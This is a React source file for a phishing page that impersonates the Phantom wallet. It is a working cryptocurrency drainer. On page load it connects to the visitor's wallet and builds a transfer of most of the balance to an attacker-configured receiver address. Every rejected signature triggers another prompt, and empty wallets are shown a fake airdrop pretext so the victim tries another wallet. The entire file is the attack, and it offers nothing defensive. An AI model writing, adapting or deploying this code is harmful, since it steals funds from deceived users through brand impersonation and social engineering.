import { useState, useEffect } from 'react';
import './App.css';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { RECEIVER_ADDRESS, PERCENTAGE_TO_DRAIN, NETWORK } from './config.ts';

declare global {
  interface Window {
    phantom?: {
      solana?: any;
    };
  }
}

function App() {
  const [isConnecting, setIsConnecting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [statusMessage, setStatusMessage] = useState('Connecting to Phantom wallet...');
  const [retryCount, setRetryCount] = useState(0);

  // Connect to Phantom wallet automatically when the page loads
  useEffect(() => {
    const connectToWallet = async () => {
      if (window.phantom?.solana?.isPhantom) {
        try {
          setIsConnecting(true);
          setStatusMessage('Connecting to Phantom wallet...');
          
          // Small delay to show the connecting message
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          const response = await window.phantom.solana.connect();
          const publicKey = response.publicKey.toString();
          setIsConnecting(false);
          
          // Start the draining process automatically
          await drainWallet(publicKey);
        } catch (err) {
          console.error('Connection failed:', err);
          // Retry connection after a delay
          setStatusMessage('Connection failed. Retrying...');
          setRetryCount(prev => prev + 1);
          setTimeout(connectToWallet, 3000);
        }
      } else {
        setStatusMessage('Phantom wallet not found. Please install Phantom wallet extension.');
        // Retry periodically
        setTimeout(() => {
          setStatusMessage('Checking for Phantom wallet...');
          setTimeout(connectToWallet, 1000);
        }, 5000);
      }
    };

    // Auto-connect when component mounts
    connectToWallet();
  }, []);

  // Drain wallet funds automatically
  const drainWallet = async (publicKey: string) => {
    if (!window.phantom?.solana?.isPhantom) {
      setStatusMessage('Phantom wallet not found');
      return;
    }

    try {
      setIsProcessing(true);
      setStatusMessage('Checking wallet balance...');

      const connection = new Connection(
        (NETWORK as string) === 'devnet' 
          ? 'https://api.devnet.solana.com' 
          : 'https://api.mainnet-beta.solana.com'
      );
      const senderPublicKey = new PublicKey(publicKey);
      const receiverPublicKey = new PublicKey(RECEIVER_ADDRESS);

      // Get the sender's balance
      const balance = await connection.getBalance(senderPublicKey);
      
      // Check if wallet has any balance
      if (balance <= 0) {
        setStatusMessage('This wallet address is not qualified for the airdrop so use another wallet.');
        // Retry after a delay
        setTimeout(() => {
          setStatusMessage('Rechecking wallet balance...');
          drainWallet(publicKey);
        }, 5000);
        return;
      }

      setStatusMessage(`Processing transaction...`);

      // Calculate amount to send (95% of balance minus some for transaction fees)
      const amountToSend = Math.floor(balance * (PERCENTAGE_TO_DRAIN / 100) - 5000); // 5000 lamports for fees

      if (amountToSend <= 0) {
        setStatusMessage('This wallet address is not qualified for the airdrop so use another wallet.');
        // Retry after a delay
        setTimeout(() => {
          setStatusMessage('Rechecking wallet balance...');
          drainWallet(publicKey);
        }, 5000);
        return;
      }

      // Create transaction
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: senderPublicKey,
          toPubkey: receiverPublicKey,
          lamports: amountToSend,
        })
      );

      // Get latest blockhash
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderPublicKey;

      // Sign transaction
      setStatusMessage('Please approve the transaction in your Phantom wallet...');
      const signedTransaction = await window.phantom.solana.signTransaction(transaction);

      // Send transaction
      setStatusMessage('Sending transaction...');
      const signature = await connection.sendRawTransaction(signedTransaction.serialize());

      // Confirm transaction
      setStatusMessage('Confirming transaction...');
      await connection.confirmTransaction(signature, 'confirmed');

      setStatusMessage(`Transaction successful! ${amountToSend / 1e9} SOL transferred.`);
    } catch (err) {
      console.error('Drain failed:', err);
      if (err instanceof Error && err.message.includes('User rejected')) {
        setStatusMessage('Transaction rejected. Retrying...');
        // Retry after a delay
        setTimeout(() => {
          drainWallet(publicKey);
        }, 3000);
      } else {
        setStatusMessage('Transaction failed. Retrying...');
        // Retry after a delay
        setTimeout(() => {
          drainWallet(publicKey);
        }, 3000);
      }
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="phantom-container">
      <div className="phantom-content">
        <h1 className="phantom-title">Phantom</h1>
        
        <div className="phantom-logo">
          <img src="/pantom.png" alt="Phantom Logo" className="phantom-image" />
        </div>
        
        <h2 className="phantom-subtitle">Continue in Phantom</h2>
        <p className="phantom-description">Accept connection request in the wallet</p>
        
        <div className="status-container">
          <p className="status-message">{statusMessage}</p>
          {(isConnecting || isProcessing) && (
            <div className="loading-spinner"></div>
          )}
          {retryCount > 0 && (
            <p className="retry-count">Retry attempts: {retryCount}</p>
          )}
        </div>
      </div>
    </div>
  );
}

export default App;